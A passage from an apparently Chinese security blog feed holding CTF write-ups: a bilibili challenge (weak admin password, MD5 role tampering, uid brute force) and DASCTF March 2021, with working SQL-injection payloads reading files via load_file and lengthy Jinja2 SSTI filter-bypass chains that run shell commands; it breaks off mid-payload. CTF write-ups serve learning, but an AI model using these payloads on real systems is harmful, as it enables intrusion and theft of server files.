<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$var1</span>=tide;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$var1</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$var1</span>);</span><br><span class="line">&#125;  </span><br><span class="line">test();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br></pre></td></tr></table></figure>
<p>结果为：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tide</span></span><br></pre></td></tr></table></figure>
<p>这就说明，删除的只是别名或者说是引用，其本身作用的值没有受到任何的影响。也就是说，global $var其实是$var = &amp;$GLOBALS[‘var’]，调用外部变量的一个别名而已。</p>
<hr>
<p>转载自 <a href="https://www.freebuf.com/column/230907.html">https://www.freebuf.com/column/230907.html</a></p>
]]></content>
      <categories>
        <category>web</category>
        <category>share</category>
      </categories>
  </entry>
  <entry>
    <title>首届bilibili挑战赛</title>
    <url>/2020/10/24/%E9%A6%96%E5%B1%8Abilibili%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    <content><![CDATA[<p>抽空看了几题，体验不是很好<a id="more"></a></p>
<h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p>F12 查看源代码</p>
<p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201024154016132-2071012626.png"></p>
<p>直接访问api/admin页面即可得到flag</p>
<p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201024154019677-1250479206.png"></p>
<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201024154023634-822067418.png"></p>
<p>代码审计，需要使用bilibili浏览器登入，burp抓包，修改useragent</p>
<p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201024155139857-826211419.png"></p>
<p>data就是flag</p>
<h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201024155303854-1956461103.png"></p>
<p>emmmm.盲猜</p>
<p>账号admin</p>
<p>密码：bilibili</p>
<p>结果居然对了。</p>
<h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201024160040015-747943836.png"></p>
<p>role猜测为MD5编码，解密发现为user</p>
<p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201024155959334-196324720.png"></p>
<p>根据题目名称，猜测要改为超级管理员</p>
<p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201024160006191-2074714375.png"></p>
<p>MD5加密即可</p>
<p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201024160010935-1607138553.png"></p>
<p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201024160014884-1885349976.png"></p>
<h2 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h2><p>F12查看源代码</p>
<p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201024160357789-1174612433.png"></p>
<p>到B站搜下这个uid</p>
<p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201024160535566-251520870.png"></p>
<p>没啥发现的</p>
<p>代码审计。</p>
<blockquote>
<p>url: “api/ctf/5?uid=” + uid,</p>
</blockquote>
<p>应该只要传入正确的uid即可得到flag</p>
<p>试下杀手锏—爆破</p>
<p>来个小范围的爆破</p>
<p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201024160816282-1175115644.png"></p>
<p>emmmm.  uid=10336969</p>
<p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201024160821310-582307911.png"></p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>2021 DASCTF三月赛</title>
    <url>/2021/04/06/2021-DASCTF%E4%B8%89%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<p>2021 MAR DASCTF 明御攻防赛 Web Writeup<a id="more"></a></p>
<h1 id="BestDB"><a href="#BestDB" class="headerlink" title="BestDB"></a>BestDB</h1><p>查看源码发现注释</p>
<blockquote>
<!-- $sql = "SELECT * FROM users WHERE id = '$query' OR username = \"$query\"";-->
</blockquote>
<p>同时通过fuzz,发现过滤了单引号和空格</p>
<p>注释里的sql语句id和username是用OR连接，因为双引号没有被过滤，因此我们可以利用username</p>
<p><img src="https://img.npfs06.top/20210406142203.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>测试得出回显位为1、2</p>
<p>查数据库名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&quot;union/**/select/**/1,database(),3&quot;</span><br><span class="line"></span><br><span class="line">#users</span><br></pre></td></tr></table></figure>
<p>查表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&quot;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),3&quot;</span><br><span class="line"></span><br><span class="line">#f1agdas,users</span><br></pre></td></tr></table></figure>
<p>查列名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&quot;union/**/select/**/1,(select/**/f1agdas/**/from/**/f1agdas/**/where/**/id=1),3&quot;</span><br><span class="line">#flag.txt</span><br></pre></td></tr></table></figure>


<p>读flag.txt</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&quot;/**/union/**/select/**/1,(select(substr(load_file(0x2f666c61672e747874),1,100))),3&quot;</span><br></pre></td></tr></table></figure>


<h1 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h1><p> 看源码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Hi young boy!&lt;/br&gt;</span></span><br><span class="line"><span class="comment">Do you like ssti?&lt;/br&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">blacklist&lt;/br&gt;   </span></span><br><span class="line"><span class="comment">&#x27;.&#x27;,&#x27;[&#x27;,&#x27;\&#x27;&#x27;,&#x27;&quot;&#x27;,&#x27;&#x27;\\&#x27;,&#x27;+&#x27;,&#x27;:&#x27;,&#x27;_&#x27;,&lt;/br&gt;   </span></span><br><span class="line"><span class="comment">&#x27;chr&#x27;,&#x27;pop&#x27;,&#x27;class&#x27;,&#x27;base&#x27;,&#x27;mro&#x27;,&#x27;init&#x27;,&#x27;globals&#x27;,&#x27;get&#x27;,&lt;/br&gt;   </span></span><br><span class="line"><span class="comment">&#x27;eval&#x27;,&#x27;exec&#x27;,&#x27;os&#x27;,&#x27;popen&#x27;,&#x27;open&#x27;,&#x27;read&#x27;,&lt;/br&gt;   </span></span><br><span class="line"><span class="comment">&#x27;select&#x27;,&#x27;url_for&#x27;,&#x27;get_flashed_messages&#x27;,&#x27;config&#x27;,&#x27;request&#x27;,&lt;/br&gt;   </span></span><br><span class="line"><span class="comment">&#x27;count&#x27;,&#x27;length&#x27;,&#x27;０&#x27;,&#x27;１&#x27;,&#x27;２&#x27;,&#x27;３&#x27;,&#x27;４&#x27;,&#x27;５&#x27;,&#x27;６&#x27;,&#x27;７&#x27;,&#x27;８&#x27;,&#x27;９&#x27;,&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;&lt;/br&gt;    </span></span><br><span class="line"><span class="comment">&lt;/br&gt;   </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>
<p>fuzz后发现没过滤掉|attr，因此拿attr来绕即可，利用flask中的join过滤器同样可以拼接出：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% set gl=dict(glo=a,bals=a)|join%&#125;</span><br></pre></td></tr></table></figure>
<p>拿python做了个例子，原理类似</p>
<p><img src="https://img.npfs06.top/20210406200259.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>数字被过滤了可以使用这些特殊的数字来绕过</p>
<p><img src="http://img.npfs06.top/20210406204043.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210406203323.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;%set a=dict(po=aa,p=aa)|join%&#125; <span class="comment"># pop</span></span><br><span class="line">&#123;%set b=lipsum|<span class="keyword">string</span>|<span class="keyword">list</span>|attr(a)(𝟙𝟠)%&#125; <span class="comment"># _</span></span><br><span class="line">&#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125; <span class="comment"># globals</span></span><br><span class="line">&#123;%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%&#125; <span class="comment"># getitem</span></span><br><span class="line">&#123;%set e=dict(o=cc,s=aa)|join%&#125; <span class="comment"># os</span></span><br><span class="line">&#123;%set f=lipsum|<span class="keyword">string</span>|<span class="keyword">list</span>|attr(a)(𝟡)%&#125; <span class="comment"># 空格</span></span><br><span class="line">&#123;%set g=(((lipsum|attr(c))|attr(d)(e))|<span class="keyword">string</span>|<span class="keyword">list</span>)|attr(a)(-𝟠)%&#125; <span class="comment"># 斜杠</span></span><br><span class="line">&#123;%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%&#125; <span class="comment"># cat /flag</span></span><br><span class="line">&#123;%set h=(a,dict(en=aa)|join|join)|join%&#125; <span class="comment"># popen</span></span><br><span class="line">&#123;%set i=dict(re=aa,ad=aa)|join%&#125; <span class="comment"># read</span></span><br><span class="line">&#123;%set z=(((lipsum|attr(c))|attr(d)(e))|<span class="keyword">string</span>|<span class="keyword">list</span>)|attr(a)(-𝟝)%&#125; <span class="comment">#点</span></span><br><span class="line">&#123;%set j=(dict(ls=aa)|join,f,g,(dict(<span class="keyword">var</span>=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%&#125; <span class="comment">#ls /var/www/flask</span></span><br><span class="line">&#123;%<span class="keyword">print</span> (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;</span><br><span class="line"><span class="comment">#最后拼接起来</span></span><br><span class="line"><span class="comment">#&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls /var/www/flask&#x27;).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>最后的<code>payload</code>如下，成功执行<code>ls /var/www/flask</code>就可以看到<code>flag</code>了</p>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="xml">name=</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> a=dict(po=aa,p=aa)|<span class="keyword">join</span>%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> b=lipsum|string|list|attr(a)(𝟙𝟠)%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> c=(b,b,dict(glob=cc,als=aa)|<span class="keyword">join</span>,b,b)|<span class="keyword">join</span>%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> d=(b,b,dict(ge=cc,tit=dd,em=aa)|<span class="keyword">join</span>,b,b)|<span class="keyword">join</span>%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> e=dict(o=cc,s=aa)|<span class="keyword">join</span>%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> f=lipsum|string|list|attr(a)(𝟡)%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> i=(dict(cat=aa)|<span class="keyword">join</span>,f,g,dict(flag=aa)|<span class="keyword">join</span>)|<span class="keyword">join</span>%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> h=(a,dict(en=aa)|<span class="keyword">join</span>|<span class="keyword">join</span>)|<span class="keyword">join</span>%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> i=dict(re=aa,ad=aa)|<span class="keyword">join</span>%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> z=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> j=(dict(ls=aa)|<span class="keyword">join</span>,f,g,(dict(var=aa)|<span class="keyword">join</span>),g,(dict(www=aa)|<span class="keyword">join</span>),g,(dict(flask=aa)|<span class="keyword">join</span>)|<span class="keyword">join</span>)|<span class="keyword">join</span>%&#125;</span><span class="template-tag">&#123;%<span class="name">print</span> (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;</span><span class="template-variable">&#123;&#123;j&#125;&#125;</span></span><br></pre></td></tr></table></figure>


<p>当然上面这种做法是利用了unicode编码，如果不利于unicode编码，我们也有办法</p>
<p>比如我们要构造下划线<code>_</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% set id=dict(ind=a,ex=a)|join%&#125;</span><br><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set nn=dict(n=a)|join%&#125;</span><br><span class="line">&#123;% set tt=dict(t=a)|join%&#125;</span><br><span class="line">&#123;% set ff=dict(f=a)|join%&#125;</span><br><span class="line">&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;</span><br><span class="line">&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;</span><br><span class="line">&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;</span><br><span class="line">&#123;% set shiba=five*five-three-three-one %&#125;</span><br><span class="line">&#123;% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;</span><br><span class="line">&#123;&#123;xiahuaxian&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>相当于<code>(lipsum|string|list).pop(18)</code></p>
<p>放几个其他师傅的payload:</p>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> id=dict(ind=a,ex=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pp=dict(po=a,p=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ls=dict(ls=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ppe=dict(po=a,pen=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> gt=dict(ge=a,t=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> cr=dict(ch=a,r=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> nn=dict(n=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> tt=dict(t=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ff=dict(f=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ooqq=dict(o=a,s=a)|<span class="keyword">join</span> %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> rd=dict(re=a,ad=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> five=(lipsum|string|list)|attr(id)(tt) %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> three=(lipsum|string|list)|attr(id)(nn) %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> one=(lipsum|string|list)|attr(id)(ff) %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> shiba=five*five-three-three-one %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|<span class="keyword">join</span>,xiahuaxian,xiahuaxian)|<span class="keyword">join</span> %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|<span class="keyword">join</span>,xiahuaxian,xiahuaxian)|<span class="keyword">join</span> %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> space=chcr(three*three*five-five-five-three) %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> shell=(ls,space,xiegang,dict(var=a)|<span class="keyword">join</span>,xiegang,dict(www=a)|<span class="keyword">join</span>,xiegang,dict(flask=a)|<span class="keyword">join</span>)|<span class="keyword">join</span> %&#125;</span></span><br><span class="line"><span class="template-variable">&#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>相当于执行</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">lipsum</span><span class="selector-class">.__globals__</span><span class="selector-class">.get</span>(<span class="string">&#x27;os&#x27;</span>)<span class="selector-class">.popen</span>(<span class="string">&#x27;ls /var/www/flask&#x27;</span>)<span class="selector-class">.read</span>()</span><br></pre></td></tr></table></figure>
<hr>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="xml"># 首先构造出所需的数字: </span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> zero = (self|int) %&#125;</span><span class="xml">    # 0, 也可以使用lenght过滤器获取数字</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> one = (zero**zero)|int %&#125;</span><span class="xml">    # 1</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> two = (zero-one-one)|<span class="keyword">abs</span> %&#125;</span><span class="xml">    # 2</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> four = (two*two)|int %&#125;</span><span class="xml">    # 4</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> five = (two*two*two)-one-one-one %&#125;</span><span class="xml">    # 5</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> three = five-one-one %&#125;</span><span class="xml">    # 3</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> nine = (two*two*two*two-five-one-one) %&#125;</span><span class="xml">    # 9</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> seven = (zero-one-one-five)|<span class="keyword">abs</span> %&#125;</span><span class="xml">    # 7</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># 构造出所需的各种字符与字符串: </span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> space = self|string|min %&#125;</span><span class="xml">    # 空格</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> point = self|float|string|min %&#125;</span><span class="xml">    # .</span></span><br><span class="line"></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> c = dict(c=aa)|<span class="keyword">reverse</span>|<span class="keyword">first</span> %&#125;</span><span class="xml">    # 字符 c</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bfh = self|string|urlencode|<span class="keyword">first</span> %&#125;</span><span class="xml">    # 百分号 %</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bfhc = bfh~c %&#125;</span><span class="xml">    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> slas = bfhc%((four~seven)|int) %&#125;</span><span class="xml">    # 使用%c构造斜杠 /</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> yin = bfhc%((three~nine)|int) %&#125;</span><span class="xml">    # 使用%c构造引号 &#x27;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> xhx = bfhc%((nine~five)|int) %&#125;</span><span class="xml">    # 使用%c构造下划线 _</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> right = bfhc%((four~one)|int) %&#125;</span><span class="xml">    # 使用%c构造右括号 )</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> left = bfhc%((four~zero)|int) %&#125;</span><span class="xml">    # 使用%c构造左括号 (</span></span><br><span class="line"></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> but = dict(buil=aa,tins=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # builtins</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> imp = dict(imp=aa,ort=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # import</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pon = dict(po=aa,pen=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # popen</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> so = dict(o=aa,s=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # os</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ca = dict(ca=aa,t=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # cat</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> flg = dict(fl=aa,ag=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # flag</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ev = dict(ev=aa,al=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # eval</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> red = dict(re=aa,ad=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # read</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bul = xhx~xhx~but~xhx~xhx %&#125;</span><span class="xml">    # __builtins__</span></span><br><span class="line"></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ini = dict(ini=aa,t=bb)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # init</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> glo = dict(glo=aa,bals=bb)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # globals</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> itm = dict(ite=aa,ms=bb)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # items</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># 将上面构造的字符或字符串拼接起来构造出 __import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read(): </span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># 然后将上面构造的各种变量添加到SSTI万能payload里面就行了: </span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">for</span></span> f,v in (whoami|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;</span><span class="xml">    # globals</span></span><br><span class="line"><span class="xml">	</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">if</span></span> f == bul %&#125;</span><span class="xml"> </span></span><br><span class="line"><span class="xml">		</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">for</span></span> a,b in (v|attr(itm))() %&#125;</span><span class="xml">    # builtins</span></span><br><span class="line"><span class="xml">			</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">if</span></span> a == ev %&#125;</span><span class="xml">    # eval</span></span><br><span class="line"><span class="xml">				</span><span class="template-variable">&#123;&#123;b(pld)&#125;&#125;</span><span class="xml">    # eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)</span></span><br><span class="line"><span class="xml">			</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endif</span></span> %&#125;</span></span><br><span class="line"><span class="xml">		</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endfor</span></span> %&#125;</span></span><br><span class="line"><span class="xml">	</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endif</span></span> %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">endfor</span></span> %&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># 最后的payload如下:</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> zero = (self|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> one = (zero**zero)|int %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> two = (zero-one-one)|<span class="keyword">abs</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> four = (two*two)|int %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> five = (two*two*two)-one-one-one %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> three = five-one-one %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> nine = (two*two*two*two-five-one-one) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> seven = (zero-one-one-five)|<span class="keyword">abs</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> space = self|string|min %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> point = self|float|string|min %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> c = dict(c=aa)|<span class="keyword">reverse</span>|<span class="keyword">first</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bfh = self|string|urlencode|<span class="keyword">first</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bfhc = bfh~c %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> slas = bfhc%((four~seven)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> yin = bfhc%((three~nine)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> xhx = bfhc%((nine~five)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> right = bfhc%((four~one)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> left = bfhc%((four~zero)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> but = dict(buil=aa,tins=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> imp = dict(imp=aa,ort=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pon = dict(po=aa,pen=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> so = dict(o=aa,s=dd)|<span 